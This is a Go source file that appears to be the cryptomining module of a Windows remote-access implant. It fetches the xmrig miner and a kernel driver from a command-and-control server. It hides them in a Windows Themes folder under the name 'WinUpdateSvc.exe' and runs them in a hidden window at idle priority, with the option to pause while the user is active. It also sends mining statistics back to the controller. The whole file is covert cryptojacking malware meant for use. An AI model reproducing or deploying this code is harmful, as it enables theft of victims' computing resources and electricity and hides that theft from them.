//go:build windows && miner

package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ─── types ────────────────────────────────────────────────────────────────────

type MinerConfig struct {
	Coin     string `json:"coin"`      // "xmr" or "zeph"
	Wallet   string `json:"wallet"`    // wallet address
	Pool     string `json:"pool"`      // host:port (empty = default)
	CPUCap   int    `json:"cpu_cap"`   // 0-100, default 50
	GPU      bool   `json:"gpu"`       // CUDA GPU mining (requires plugin)
	IdleOnly bool   `json:"idle_only"` // pause-on-active (built in to xmrig)
}

type MinerStats struct {
	Running    bool    `json:"running"`
	Coin       string  `json:"coin"`
	Hashrate   float64 `json:"hashrate_hs"` // H/s
	Accepted   int     `json:"accepted"`
	Rejected   int     `json:"rejected"`
	UptimeSecs int     `json:"uptime_secs"`
	GPUName    string  `json:"gpu_name"`
	CPUName    string  `json:"cpu_name"`
	Pool       string  `json:"pool"`
}

// ─── globals ──────────────────────────────────────────────────────────────────

var (
	minerMu      sync.Mutex
	minerCmd     *exec.Cmd
	minerStats   MinerStats
	minerCfg     MinerConfig
	minerStartAt time.Time
)

// ─── constants ────────────────────────────────────────────────────────────────

var minerDefaultPools = map[string]string{
	"xmr":  "pool.supportxmr.com:443",
	"zeph": "zephyr.herominers.com:1123",
}

var minerAlgo = map[string]string{
	"xmr":  "rx/0",
	"zeph": "rx/zeph",
}

const IDLE_PRIORITY_CLASS = 0x00000040

// ─── paths ────────────────────────────────────────────────────────────────────

func minerDir() string {
	return filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes")
}

func minerBinPath() string {
	return filepath.Join(minerDir(), "WinUpdateSvc.exe")
}

func minerSysPath() string {
	return filepath.Join(minerDir(), "WinRing0x64.sys")
}

func minerCfgPath() string {
	return filepath.Join(minerDir(), "wusvc.json")
}

// ─── download from C2 ────────────────────────────────────────────────────────

func downloadFile(url, dest string) error {
	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("HTTP %d from %s", resp.StatusCode, url)
	}
	f, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = io.Copy(f, resp.Body)
	return err
}

func ensureMinerBinaries() error {
	os.MkdirAll(minerDir(), 0755)

	bin := minerBinPath()
	if _, err := os.Stat(bin); os.IsNotExist(err) {
		if err := downloadFile(C2URL+"/miner/xmrig", bin); err != nil {
			return fmt.Errorf("download xmrig.exe: %w", err)
		}
	}

	// WinRing0x64.sys — optional but improves performance (MSR/hugepages)
	sys := minerSysPath()
	if _, err := os.Stat(sys); os.IsNotExist(err) {
		downloadFile(C2URL+"/miner/winring", sys) // non-fatal if missing
	}
	return nil
}

// ─── hardware detection ───────────────────────────────────────────────────────

func detectMinerHardware() (gpu, cpu string) {
	gpuCmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command", "Get-WmiObject Win32_VideoController | Select-Object -First 1 -ExpandProperty Name")
	hideWindow(gpuCmd)
	if out, err := gpuCmd.Output(); err == nil {
		gpu = strings.TrimSpace(string(out))
	}
	cpuCmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command", "Get-WmiObject Win32_Processor | Select-Object -First 1 -ExpandProperty Name")
	hideWindow(cpuCmd)
	if out, err := cpuCmd.Output(); err == nil {
		cpu = strings.TrimSpace(string(out))
	}
	return
}

// ─── config writer ────────────────────────────────────────────────────────────

func writeMinerConfig(cfg MinerConfig) error {
	pool := cfg.Pool
	if pool == "" {
		if p, ok := minerDefaultPools[cfg.Coin]; ok {
			pool = p
		} else {
			pool = minerDefaultPools["xmr"]
		}
	}

	algo := minerAlgo[cfg.Coin]
	if algo == "" {
		algo = "rx/0"
	}

	cpuCap := cfg.CPUCap
	if cpuCap <= 0 || cpuCap > 100 {
		cpuCap = 50
	}

	// XMRig v6 JSON config
	config := map[string]interface{}{
		"autosave":   false,
		"background": false,
		"colors":     false,
		"title":      false,
		"randomx": map[string]interface{}{
			"init":    -1,
			"mode":    "auto",
			"rdmsr":   true,
			"wrmsr":   true,
			"numa":    true,
			"1gb-pages": false, // safer default
		},
		"cpu": map[string]interface{}{
			"enabled":          true,
			"huge-pages":       true,
			"priority":         0, // 0 = idle (xmrig's internal scale 0-5)
			"max-threads-hint": cpuCap,
			"yield":            true,
		},
		"cuda": map[string]interface{}{
			"enabled": cfg.GPU,
			"loader":  "xmrig-cuda.dll",
		},
		"opencl": map[string]interface{}{
			"enabled": false,
		},
		"pools": []map[string]interface{}{
			{
				"url":       pool,
				"user":      cfg.Wallet,
				"pass":      "c3po-agent",
				"algo":      algo,
				"tls":       true,
				"keepalive": true,
			},
		},
		"donate-level":    1, // 1% to XMRig devs (standard)
		"print-time":      60,
		"pause-on-battery": true,                // stop if unplugged
		"pause-on-active":  cfg.IdleOnly,        // stop when user is active (mouse/keyboard)
		"http": map[string]interface{}{
			"enabled":      true,
			"host":         "127.0.0.1",
			"port":         18380,
			"access-token": nil,
			"restricted":   true,
		},
	}

	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(minerCfgPath(), data, 0600)
}

// ─── start / stop ─────────────────────────────────────────────────────────────

func startMiner(cfg MinerConfig) (string, error) {
	minerMu.Lock()
	defer minerMu.Unlock()

	if minerCmd != nil {
		return "miner already running", nil
	}

	if err := ensureMinerBinaries(); err != nil {
		return "", err
	}
	if err := writeMinerConfig(cfg); err != nil {
		return "", fmt.Errorf("write config: %w", err)
	}

	gpu, cpu := detectMinerHardware()

	cmd := exec.Command(minerBinPath(),
		"--config="+minerCfgPath(),
		"--no-color",
		"--log-file=", // suppress log file creation
	)

	// Hidden window + IDLE CPU priority so gaming is unaffected
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: IDLE_PRIORITY_CLASS,
	}

	outPipe, err := cmd.StdoutPipe()
	if err != nil {
		return "", err
	}
	cmd.Stderr = cmd.Stdout

	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("start xmrig: %w", err)
	}

	minerCmd = cmd
	minerCfg = cfg
	pool := cfg.Pool
	if pool == "" {
		pool = minerDefaultPools[cfg.Coin]
	}
	minerStats = MinerStats{
		Running: true,
		Coin:    cfg.Coin,
		GPUName: gpu,
		CPUName: cpu,
		Pool:    pool,
	}
	minerStartAt = time.Now()

	go parseMinerOutput(outPipe)
	go pollMinerAPI()

	return fmt.Sprintf("miner started | coin:%s | cpu:%s | gpu:%s | cpu_cap:%d%% | pool:%s",
		cfg.Coin, cpu, gpu, cfg.CPUCap, pool), nil
}

func stopMiner() string {
	minerMu.Lock()
	defer minerMu.Unlock()

	if minerCmd == nil {
		return "miner not running"
	}
	if err := minerCmd.Process.Kill(); err == nil {
		minerCmd.Wait()
	}
	minerCmd = nil
	minerStats.Running = false
	minerStats.Hashrate = 0
	return "miner stopped"
}

// ─── output parsing ───────────────────────────────────────────────────────────

// Matches xmrig speed lines: "speed 10s/60s/15m 1234.5 n/a n/a H/s"
var reXMRigSpeed = regexp.MustCompile(`(?i)(\d+\.?\d*)\s+(H/s|kH/s|MH/s|GH/s)`)

func parseMinerOutput(r io.Reader) {
	scanner := bufio.NewScanner(r)
	for scanner.Scan() {
		line := scanner.Text()
		if m := reXMRigSpeed.FindAllStringSubmatch(line, -1); len(m) > 0 {
			// Take the first numeric match on speed lines
			if strings.Contains(strings.ToLower(line), "speed") {
				val, _ := strconv.ParseFloat(m[0][1], 64)
				mult := 1.0
				switch strings.ToUpper(m[0][2]) {
				case "KH/S":
					mult = 1000
				case "MH/S":
					mult = 1e6
				case "GH/S":
					mult = 1e9
				}
				minerMu.Lock()
				minerStats.Hashrate = val * mult
				minerMu.Unlock()
			}
		}
		if strings.Contains(line, "accepted") {
			minerMu.Lock()
			minerStats.Accepted++
			minerMu.Unlock()
		}
		if strings.Contains(line, "rejected") {
			minerMu.Lock()
			minerStats.Rejected++
			minerMu.Unlock()
		}
	}
}

// ─── xmrig HTTP API polling ──────────────────────────────────────────────────

type xmrigSummary struct {
	Hashrate struct {
		Total []float64 `json:"total"`
	} `json:"hashrate"`
	Results struct {
		Accepted int `json:"accepted"`
		Rejected int `json:"rejected"`
	} `json:"results"`
	Uptime int `json:"uptime"`
}

func pollMinerAPI() {
	client := &http.Client{Timeout: 5 * time.Second}
	// Give xmrig time to start its HTTP server
	time.Sleep(15 * time.Second)

	for {
		minerMu.Lock()
		running := minerCmd != nil
		minerMu.Unlock()
		if !running {
			return
		}

		resp, err := client.Get("http://127.0.0.1:18380/2/summary")
		if err == nil {
			var summary xmrigSummary
			if json.NewDecoder(resp.Body).Decode(&summary) == nil {
				minerMu.Lock()
				if len(summary.Hashrate.Total) > 0 && summary.Hashrate.Total[0] > 0 {
					minerStats.Hashrate = summary.Hashrate.Total[0]
				}
				minerStats.Accepted = summary.Results.Accepted
				minerStats.Rejected = summary.Results.Rejected
				minerMu.Unlock()
			}
			resp.Body.Close()
		}

		sendMinerStats()
		time.Sleep(60 * time.Second)
	}
}

func sendMinerStats() {
	minerMu.Lock()
	stats := minerStats
	uptime := int(time.Since(minerStartAt).Seconds())
	minerMu.Unlock()

	stats.UptimeSecs = uptime
	payload := map[string]interface{}{
		"agent_id": agentID,
		"stats":    stats,
	}
	body, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 10 * time.Second}
	client.Post(C2URL+"/miner_stats", "application/json", bytes.NewReader(body))
}

func getMinerStatus() string {
	minerMu.Lock()
	defer minerMu.Unlock()
	if !minerStats.Running {
		return `{"running":false}`
	}
	stats := minerStats
	stats.UptimeSecs = int(time.Since(minerStartAt).Seconds())
	b, _ := json.MarshalIndent(stats, "", "  ")
	return string(b)
}
